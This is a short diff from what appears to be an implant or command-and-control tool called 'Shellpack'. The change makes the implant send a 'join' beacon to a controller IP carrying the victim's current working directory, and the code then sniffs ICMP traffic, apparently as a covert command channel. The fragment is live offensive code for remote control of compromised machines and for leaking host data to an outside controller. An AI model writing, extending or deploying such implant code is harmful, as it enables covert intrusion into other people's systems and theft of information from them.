@@ -46,7 +46,7 @@ if __name__ == "__main__":
 
     print("[ Shellpack log ]")
     # Send join command
-    implant.send(implant.controller_ip, "join")
+    implant.send(implant.controller_ip, "join", os.getcwd().encode())
 
     # Start sniffing
     sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
